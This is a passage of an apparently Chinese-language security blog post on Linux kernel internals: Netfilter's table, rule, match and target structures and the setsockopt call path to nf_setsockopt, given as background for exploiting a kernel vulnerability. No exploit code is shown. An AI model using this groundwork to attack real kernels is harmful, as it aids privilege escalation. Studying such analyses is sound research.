class="code"><pre><code class="hljs makefile">CONFIG_USER_NS=y<br>CONFIG_NET_NS=y<br>CONFIG_COMPAT=y<br></code></pre></td></tr></table></figure><h2 id="Netfilter"><a href="#Netfilter" class="headerlink" title="Netfilter"></a>Netfilter</h2><p>Netfilter 为 Linux 内核中的一个子模块，用以提供数据包过滤、网络地址转换、端口转换等功能，其整体框架如下图所示</p><p><img src="https://s2.loli.net/2022/03/28/SFpO9z7YRykLnqU.png" alt="Netfilter components"></p><p>例如 <code>iptables</code> 等工具便是利用 Netfilter 所提供的接口实现的，不过本篇我们主要关注其在内核中的部分</p><p>Netfilter 涵盖了内核网络协议栈的多层，一个数据包在 Netfilter 中的历程如下图所示：</p><p><img src="https://s2.loli.net/2022/03/28/8UnfDE7Mry1uhgW.png" alt="image.png"></p><p>在 Netfilter 中有一种名为 「table」 的结构，用以存储不同功能的配置信息，在内核当中使用 <code>xt_table</code> 结构表示：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">/* Furniture shopping... */</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">xt_table</span> &#123;</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">list_head</span> <span class="hljs-title">list</span>;</span><br><br><span class="hljs-comment">/* What hooks you will enter on */</span><br><span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> valid_hooks;<br><br><span class="hljs-comment">/* Man behind the curtain... */</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">xt_table_info</span> *<span class="hljs-title">private</span>;</span><br><br><span class="hljs-comment">/* Set this to THIS_MODULE if you are a module, otherwise NULL */</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">module</span> *<span class="hljs-title">me</span>;</span><br><br><span class="hljs-type">u_int8_t</span> af;<span class="hljs-comment">/* address/protocol family */</span><br><span class="hljs-type">int</span> priority;<span class="hljs-comment">/* hook order */</span><br><br><span class="hljs-comment">/* called when table is needed in the given netns */</span><br><span class="hljs-type">int</span> (*table_init)(<span class="hljs-keyword">struct</span> net *net);<br><br><span class="hljs-comment">/* A unique name... */</span><br><span class="hljs-type">const</span> <span class="hljs-type">char</span> name[XT_TABLE_MAXNAMELEN];<br>&#125;;<br></code></pre></td></tr></table></figure><p>该结构其实是一层 wrapper，其核心结构为 <code>xt_table_info</code>：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">/* The table itself */</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">xt_table_info</span> &#123;</span><br><span class="hljs-comment">/* Size per table */</span><br><span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> size;<br><span class="hljs-comment">/* Number of entries: FIXME. --RR */</span><br><span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> number;<br><span class="hljs-comment">/* Initial number of entries. Needed for module usage count */</span><br><span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> initial_entries;<br><br><span class="hljs-comment">/* Entry points and underflows */</span><br><span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> hook_entry[NF_INET_NUMHOOKS];<br><span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> underflow[NF_INET_NUMHOOKS];<br><br><span class="hljs-comment">/*</span><br><span class="hljs-comment"> * Number of user chains. Since tables cannot have loops, at most</span><br><span class="hljs-comment"> * @stacksize jumps (number of user chains) can possibly be made.</span><br><span class="hljs-comment"> */</span><br><span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> stacksize;<br><span class="hljs-type">void</span> ***jumpstack;<span class="hljs-comment">// 我超，三级指针！</span><br><br><span class="hljs-type">unsigned</span> <span class="hljs-type">char</span> entries[] __aligned(<span class="hljs-number">8</span>);<br>&#125;;<br></code></pre></td></tr></table></figure><p>在每张  table 上有多个 chain，对应表示报文的拦截处理点，例如网络层中的 IP协议 便有 5 个拦截点：</p><figure class="highlight coq"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs coq">---&gt;[NF_IP_PRE_ROUTING]---&gt;[ROUTE]---&gt;[NF_IP_FORWARD]---&gt;[NF_IP_POST_ROUTING]---&gt;<br>                              |                        <span class="hljs-type">^</span><br><span class="hljs-type">                              |                        |</span><br><span class="hljs-type">                              |                     [ROUTE</span>]<br>                              v                        |<br>                       <span class="hljs-type">[NF_IP_LOCAL_IN</span>]        [NF_IP_LOCAL_OUT]<br>                              |                        <span class="hljs-type">^</span><br><span class="hljs-type">                              |                        |</span><br><span class="hljs-type">                              v</span>                        |<br>                             <span class="hljs-type">--------Local</span> Process-------<br></code></pre></td></tr></table></figure><p>在每个 chain 中还有一些用户配置的 rule，一条 rule 可能包含一个或多个匹配规则（match）和一个执行动作（target），若报文 match 了，则执行 target 来处理报文；标准的匹配元素包含源&#x2F;目的IP地址、接收&#x2F;发送设备、传输层协议这五个元素，标准的执行动作包含 <code>accept</code>、<code>drop</code>、<code>queue</code>、<code>return</code></p><p>每条 rule 使用一个 <code>ipt_entry</code> 结构表示：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">/* This structure defines each of the firewall rules.  Consists of 3</span><br><span class="hljs-comment">   parts which are 1) general IP header stuff 2) match specific</span><br><span class="hljs-comment">   stuff 3) the target to perform if the rule matches */</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">ipt_entry</span> &#123;</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">ipt_ip</span> <span class="hljs-title">ip</span>;</span><br><br><span class="hljs-comment">/* Mark with fields that we care about. */</span><br><span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> nfcache;<br><br><span class="hljs-comment">/* Size of ipt_entry + matches */</span><br>__u16 target_offset;<br><span class="hljs-comment">/* Size of ipt_entry + matches + target */</span><br>__u16 next_offset;<br><br><span class="hljs-comment">/* Back pointer */</span><br><span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> comefrom;<br><br><span class="hljs-comment">/* Packet and byte counters. */</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">xt_counters</span> <span class="hljs-title">counters</span>;</span><br><br><span class="hljs-comment">/* The matches (if any), then the target. */</span><br><span class="hljs-type">unsigned</span> <span class="hljs-type">char</span> elems[<span class="hljs-number">0</span>];<br>&#125;;<br></code></pre></td></tr></table></figure><p>而 rule 和 target 则分别使用 <code>xt_entry_match</code> 与 <code>xt_entry_target</code> 结构表示：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">xt_entry_match</span> &#123;</span><br><span class="hljs-class"><span class="hljs-keyword">union</span> &#123;</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> &#123;</span><br>__u16 match_size;<br><br><span class="hljs-comment">/* Used by userspace */</span><br><span class="hljs-type">char</span> name[XT_EXTENSION_MAXNAMELEN];<br>__u8 revision;<br>&#125; user;<br><span class="hljs-class"><span class="hljs-keyword">struct</span> &#123;</span><br>__u16 match_size;<br><br><span class="hljs-comment">/* Used inside the kernel */</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">xt_match</span> *<span class="hljs-title">match</span>;</span><br>&#125; kernel;<br><br><span class="hljs-comment">/* Total length */</span><br>__u16 match_size;<br>&#125; u;<br><br><span class="hljs-type">unsigned</span> <span class="hljs-type">char</span> data[<span class="hljs-number">0</span>];<br>&#125;;<br><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">xt_entry_target</span> &#123;</span><br><span class="hljs-class"><span class="hljs-keyword">union</span> &#123;</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> &#123;</span><br>__u16 target_size;<br><br><span class="hljs-comment">/* Used by userspace */</span><br><span class="hljs-type">char</span> name[XT_EXTENSION_MAXNAMELEN];<br>__u8 revision;<br>&#125; user;<br><span class="hljs-class"><span class="hljs-keyword">struct</span> &#123;</span><br>__u16 target_size;<br><br><span class="hljs-comment">/* Used inside the kernel */</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">xt_target</span> *<span class="hljs-title">target</span>;</span><br>&#125; kernel;<br><br><span class="hljs-comment">/* Total length */</span><br>__u16 target_size;<br>&#125; u;<br><br><span class="hljs-type">unsigned</span> <span class="hljs-type">char</span> data[<span class="hljs-number">0</span>];<br>&#125;;<br></code></pre></td></tr></table></figure><p><code>table-&gt;chain-&gt;rule</code> 的关系如下图所示，这里我们可以看到对于单个 rule 在每个 CPU 上都维护了一份他的拷贝，这样做的目的是为了减少锁的使用、增加 L1 cache 的命中次数，以空间换时间</p><p><img src="https://s2.loli.net/2022/03/29/4hwpn7HdagVIiQL.png" alt="image.png"></p><h2 id="64-位下的-setsockopt-系统调用"><a href="#64-位下的-setsockopt-系统调用" class="headerlink" title="64 位下的 setsockopt 系统调用"></a><em>64 位下的 setsockopt 系统调用</em></h2><blockquote><p>和本漏洞没有关联，但是笔者没注意给分析了一遍…花了挺多力气所以这里也不想删了，就留下来了，如果只关注漏洞本身的可以直接跳过XD 感兴趣的话可以简单看看</p></blockquote><p>用户进程与 Netfilter 间进行通信主要是通过 <code>getsockopt</code> 与 <code>setsockopt</code> 这两个系统调用，这是一套配对使用的系统调用，用以读取或修改套接字的配置信息，我们这一次主要关注 <code>setsockopt</code></p><blockquote><p>本次漏洞利用中我们创建 socket 时使用 <code>socket(AF_INTE, SOCK_STREAM, 0)</code>，故后面涉及到的 socket 源码都会顺着这个路径分析</p></blockquote><p>在 <code>setsockopt</code> 系统调用中会调用到内核中的 <code>__sys_setsockopt()</code> ，最终调用到对应的 socket 结构体的函数表中的 <code>setsockopt</code> 函数指针（ <code>sock-&gt;ops-&gt;setsockopt()</code>）</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">static</span> <span class="hljs-type">int</span> __sys_setsockopt(<span class="hljs-type">int</span> fd, <span class="hljs-type">int</span> level, <span class="hljs-type">int</span> optname,<br>    <span class="hljs-type">char</span> __user *optval, <span class="hljs-type">int</span> optlen)<br>&#123;<br><span class="hljs-comment">//...</span><br><span class="hljs-keyword">if</span> (level == SOL_SOCKET)<br>err =<br>    sock_setsockopt(sock, level, optname, optval,<br>    optlen);<br><span class="hljs-keyword">else</span><br>err =<br>    sock-&gt;ops-&gt;setsockopt(sock, level, optname, optval,<br>  optlen);<br></code></pre></td></tr></table></figure><p>这个函数表其实是在 socket 创建时（<code>__sock_create()</code>）进行动态指定的，通过对应 family 指定的创建函数进行创建：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">int</span> __sock_create(<span class="hljs-keyword">struct</span> net *net, <span class="hljs-type">int</span> family, <span class="hljs-type">int</span> type, <span class="hljs-type">int</span> protocol,<br> <span class="hljs-keyword">struct</span> socket **res, <span class="hljs-type">int</span> kern)<br>&#123;<br>    <span class="hljs-type">int</span> err;<br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">socket</span> *<span class="hljs-title">sock</span>;</span><br><span class="hljs-type">const</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">net_proto_family</span> *<span class="hljs-title">pf</span>;</span><br>    <span class="hljs-comment">//...</span><br>rcu_read_lock();<br>pf = rcu_dereference(net_families[family]);<br>err = -EAFNOSUPPORT;<br><span class="hljs-keyword">if</span> (!pf)<br><span class="hljs-keyword">goto</span> out_release;<br><br><span class="hljs-comment">/*</span><br><span class="hljs-comment"> * We will call the -&gt;create function, that possibly is in a loadable</span><br><span class="hljs-comment"> * module, so we have to bump that loadable module refcnt first.</span><br><span class="hljs-comment"> */</span><br><span class="hljs-keyword">if</span> (!try_module_get(pf-&gt;owner))<br><span class="hljs-keyword">goto</span> out_release;<br><br><span class="hljs-comment">/* Now protected by module ref count */</span><br>rcu_read_unlock();<br><br>err = pf-&gt;create(net, sock, protocol, kern);<br></code></pre></td></tr></table></figure><p>比如说对于 <code>AF_INET</code> （<code>PF_INET</code>）而言，应该用到的是 <code>inet_create()</code> 函数：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">static</span> <span class="hljs-type">const</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">net_proto_family</span> <span class="hljs-title">inet_family_ops</span> =</span> &#123;<br>.family = PF_INET,<br>.create = inet_create,<br>.owner= THIS_MODULE,<br>&#125;;<br></code></pre></td></tr></table></figure><p>在 <code>inet_init()</code> 函数中使用 <code>sock_register</code> 在 <code>net_families</code> 数组中注册了该结构体（<code>__init</code> 宏可以看出这是一个模块初始化函数）：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">static</span> <span class="hljs-type">int</span> __init <span class="hljs-title function_">inet_init</span><span class="hljs-params">(<span class="hljs-type">void</span>)</span><br>&#123;<br>    <span class="hljs-comment">/*</span><br><span class="hljs-comment"> *Tell SOCKET that we are alive...</span><br><span class="hljs-comment"> */</span><br><br>(<span class="hljs-type">void</span>)sock_register(&amp;inet_family_ops);<br></code></pre></td></tr></table></figure><p>而在 <code>inet_create()</code> 中，则是遍历 数组找到对应类型的函数表给到 socket：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">static</span> <span class="hljs-type">int</span> <span class="hljs-title function_">inet_create</span><span class="hljs-params">(<span class="hljs-keyword">struct</span> net *net, <span class="hljs-keyword">struct</span> socket *sock, <span class="hljs-type">int</span> protocol,</span><br><span class="hljs-params">       <span class="hljs-type">int</span> kern)</span><br>&#123;<br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">sock</span> *<span class="hljs-title">sk</span>;</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">inet_protosw</span> *<span class="hljs-title">answer</span>;</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">inet_sock</span> *<span class="hljs-title">inet</span>;</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">proto</span> *<span class="hljs-title">answer_prot</span>;</span><br><span class="hljs-type">unsigned</span> <span class="hljs-type">char</span> answer_flags;<br><span class="hljs-type">int</span> try_loading_module = <span class="hljs-number">0</span>;<br><span class="hljs-type">int</span> err;<br><br><span class="hljs-keyword">if</span> (protocol &lt; <span class="hljs-number">0</span> || protocol &gt;= IPPROTO_MAX)<br><span class="hljs-keyword">return</span> -EINVAL;<br><br>sock-&gt;state = SS_UNCONNECTED;<br><br><span class="hljs-comment">/* Look for the requested type/protocol pair. */</span><br>lookup_protocol:<br>err = -ESOCKTNOSUPPORT;<br>rcu_read_lock();<br>list_for_each_entry_rcu(answer, &amp;inetsw[sock-&gt;type], <span class="hljs-built_in">list</span>) &#123;<br><br>err = <span class="hljs-number">0</span>;<br><span class="hljs-comment">/* Check the non-wild match. */</span><br><span class="hljs-keyword">if</span> (protocol == answer-&gt;protocol) &#123;<br><span class="hljs-keyword">if</span> (protocol != IPPROTO_IP)<br><span class="hljs-keyword">break</span>;<br>&#125; <span class="hljs-keyword">else</span> &#123;<br><span class="hljs-comment">/* Check for the two wild cases. */</span><br><span class="hljs-keyword">if</span> (IPPROTO_IP == protocol) &#123;<br>protocol = answer-&gt;protocol;<br><span class="hljs-keyword">break</span>;<br>&#125;<br><span class="hljs-keyword">if</span> (IPPROTO_IP == answer-&gt;protocol)<br><span class="hljs-keyword">break</span>;<br>&#125;<br>err = -EPROTONOSUPPORT;<br>&#125;<br>    <span class="hljs-comment">//...</span><br>    sock-&gt;ops = answer-&gt;ops;<br>    answer_prot = answer-&gt;prot;<br></code></pre></td></tr></table></figure><p>在这里使用内核的 rcu 遍历宏 <code>list_for_each_entry_rcu</code> 对 <code>inetsw</code> 进行遍历，实际上该链表通过 <code>inetsw_array</code> 建立，对于 <code>IPPROTO_IP</code> 而言其函数表应为 <code>inet_stream_ops</code>（我们在建立 socket 时 protocol 指定为 0，即 <code>IPPROTO_IP</code>）：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">static</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">inet_protosw</span> <span class="hljs-title">inetsw_array</span>[] =</span><br>&#123;<br>&#123;<br>.type =       SOCK_STREAM,<br>.protocol =   IPPROTO_TCP,<br>.prot =       &amp;tcp_prot,<br>.ops =        &amp;inet_stream_ops,<br>.flags =      INET_PROTOSW_PERMANENT |<br>      INET_PROTOSW_ICSK,<br>&#125;,<br></code></pre></td></tr></table></figure><p>因此我们在进行 setsockopt 时其实对应应该调用到 <code>inet_stream_ops</code> 中的 <code>sock_common_setsockopt</code>，他又会调用到 <code>sk-&gt;sk_prot-&gt;setsockopt()</code>，其实就是 socket 结构体里的 sock 结构体里的 sock_common 结构体的 <code>skc_prot</code> 成员（<code>proto</code> 结构体类型）的 <code>setsockopt</code> 函数指针（<del>你套你🦄呢</del>）</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">int</span> <span class="hljs-title function_">sock_common_setsockopt</span><span class="hljs-params">(<span class="hljs-keyword">struct</span> socket *sock, <span class="hljs-type">int</span> level, <span class="hljs-type">int</span> optname,</span><br><span class="hljs-params">   <span class="hljs-type">char</span> __user *optval, <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> optlen)</span><br>&#123;<br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">sock</span> *<span class="hljs-title">sk</span> =</span> sock-&gt;sk;<br><br><span class="hljs-keyword">return</span> sk-&gt;sk_prot-&gt;setsockopt(sk, level, optname, optval, optlen);<br>&#125;<br>EXPORT_SYMBOL(sock_common_setsockopt);<br></code></pre></td></tr></table></figure><p>又绕回前面，这里应该是对应到 <code>tcp_prot</code> 函数表，对应调用到 <code>tcp_setsockopt()</code>，在公开的 exp 中漏洞触发路径指定了 level 为 <code>SOL_IP</code>，所以这里应该会对应调用到 <code>icsk-&gt;icsk_af_ops-&gt;setsockopt</code></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">int</span> <span class="hljs-title function_">tcp_setsockopt</span><span class="hljs-params">(<span class="hljs-keyword">struct</span> sock *sk, <span class="hljs-type">int</span> level, <span class="hljs-type">int</span> optname, <span class="hljs-type">char</span> __user *optval,</span><br><span class="hljs-params">   <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> optlen)</span><br>&#123;<br><span class="hljs-type">const</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">inet_connection_sock</span> *<span class="hljs-title">icsk</span> =</span> inet_csk(sk);<br><br><span class="hljs-keyword">if</span> (level != SOL_TCP)<br><span class="hljs-keyword">return</span> icsk-&gt;icsk_af_ops-&gt;setsockopt(sk, level, optname,<br>     optval, optlen);<br><span class="hljs-keyword">return</span> do_tcp_setsockopt(sk, level, optname, optval, optlen);<br>&#125;<br>EXPORT_SYMBOL(tcp_setsockopt);<br></code></pre></td></tr></table></figure><p>这里 <code>inet_csk()</code> 展开其实就是一个强制类型转换，那这里我们又要转回去看 socket 中 sock 结构体的初始化过程，在 <code>inet_create()</code>  中使用 <code>sock_alloc()</code> 创建 sock 结构体，最后会调用到 <code>tcp_v4_init_sock</code>，这里我们看到其初始化所用的函数表为 <code>ipv4_specific</code>：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">static</span> <span class="hljs-type">int</span> <span class="hljs-title function_">tcp_v4_init_sock</span><span class="hljs-params">(<span class="hljs-keyword">struct</span> sock *sk)</span><br>&#123;<br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">inet_connection_sock</span> *<span class="hljs-title">icsk</span> =</span> inet_csk(sk);<br><br>tcp_init_sock(sk);<br><br>icsk-&gt;icsk_af_ops = &amp;ipv4_specific;<br><br><span class="hljs-meta">#<span class="hljs-keyword">ifdef</span> CONFIG_TCP_MD5SIG</span><br>tcp_sk(sk)-&gt;af_specific = &amp;tcp_sock_ipv4_specific;<br><span class="hljs-meta">#<span class="hljs-keyword">endif</span></span><br><br><span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>所以最后应该调用到 <code>ip_setsockopt</code>：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">const</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">inet_connection_sock_af_ops</span> <span class="hljs-title">ipv4_specific</span> =</span> &#123;<br><span class="hljs-comment">//...</span><br>.setsockopt   = ip_setsockopt,<br>.getsockopt   = ip_getsockopt,<br></code></pre></td></tr></table></figure><p>在  <code>ip_setsockopt</code> 中最终调用到 <code>nf_setsockopt</code>：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">int</span> <span class="hljs-title function_">ip_setsockopt</span><span class="hljs-params">(<span class="hljs-keyword">struct</span> sock *sk, <span class="hljs-type">int</span> level,</span><br><span class="hljs-params"><span class="hljs-type">int</span> optname, <span class="hljs-type">char</span> __user *optval, <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> optlen)</span><br>&#123;<br><span class="hljs-type">int</span> err;<br><br><span class="hljs-keyword">if</span> (level != SOL_IP)<br><span class="hljs-keyword">return</span> -ENOPROTOOPT;<br><br>err = do_ip_setsockopt(sk, level, optname, optval, optlen);<br><span class="hljs-meta">#<span class="hljs-keyword">if</span> IS_ENABLED(CONFIG_BPFILTER_UMH)</span><br><span class="hljs-keyword">if</span> (optname &gt;= BPFILTER_IPT_SO_SET_REPLACE &amp;&amp;<br>    optname &lt; BPFILTER_IPT_SET_MAX)<br>err = bpfilter_ip_set_sockopt(sk, optname, optval, optlen);<br><span class="hljs-meta">#<span class="hljs-keyword">endif</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">ifdef</span> CONFIG_NETFILTER</span><br><span class="hljs-comment">/* we need to exclude all possible ENOPROTOOPTs except default case */</span><br><span class="hljs-keyword">if</span> (err == -ENOPROTOOPT &amp;&amp; optname != IP_HDRINCL &amp;&amp;<br>optname != IP_IPSEC_POLICY &amp;&amp;<br>optname != IP_XFRM_POLICY &amp;&amp;<br>!ip_mroute_opt(optname))<br>err = nf_setsockopt(sk, PF_INET, optname, optval, optlen);<br><span class="hljs-meta">#<span class="hljs-keyword">endif</span></span><br><span class="hljs-keyword">return</span> err;<br>&#125;<br>EXPORT_SYMBOL(ip_setsockopt);<br></code></pre></td></tr></table></figure><p>而 setsockopt 与 getsockopt 其实都整合到了 <code>nf_sockopt()</code> 中：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span 